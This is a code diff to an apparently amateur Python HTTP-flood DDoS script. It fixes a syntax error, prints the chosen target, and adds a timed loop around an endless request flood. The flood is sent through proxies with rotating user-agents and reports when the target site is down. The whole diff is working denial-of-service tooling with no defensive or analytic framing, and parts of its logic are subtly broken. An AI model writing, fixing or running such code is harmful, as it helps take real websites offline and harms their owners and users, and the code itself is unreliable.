@@ -70,18 +70,18 @@ def attack(target, proxyfile):
     try:
         with open(proxyfile, "r") as p:
             proxies = p.read().split("\n")
-        proxcs = {'http': proxies,'https': proxies)}
+        proxcs = {'http': proxies,'https': proxies}
         r = 0
         while True:
             r += 1
             headers = {'user-agent': random.choice(headers_useragents).strip()}
-            req = requests.get(target, headers=headers, proxies=proxcs, timeout=attktime, verify=False)
+            req = requests.get(target, headers=headers, proxies=proxcs, verify=False)
             if req.status_code >= 500:
                 print(f"{G}[+] Target Website is down! DDoS attack successful!")
             elif req.status_code == 403:
                 print(f"{R}[!] DDoS attack bloked!!!")
             elif req.status_code >= 200 and req.status_code < 500:
-                print(f"{Y}[*] Attacking https://example.com, Sending 10000 Request.")
+                print(f"{Y}[*] Attacking {target}, Sending 10000 Request.")
             else:
                 print(f"{R}Unexpected status code: {req.status_code}")
 
@@ -109,12 +109,16 @@ def main(target, proxyfile):
         sys.stdout.flush()
         time.sleep(0.05)
     time.sleep(1)
-    attack(target, proxyfile)
+    start_time = time.time()
+    while time.time() - start_time < attack_time:
+        attack(target, proxyfile)
+
+    print(f"{G}[+] Attack completed. Attack duration: {time.time() - start_time:.2f} seconds.")
 
 if __name__ == "__main__":
     target = input(f"{B}Enter the target: ")
     num_threads = int(input(f"{B}Amount of threads to use: "))
-    attktime = int(input(f"{B}Set timeout for your attacks(sec): "))
+    attack_time = int(input(f"{B}Set timeout for your attacks(sec): "))
     proxyfile = input(f"{B}Enter the proxy file: ")
     if os.path.isfile(proxyfile):
         print(f"{G}[+]Success! proxy file is found!")
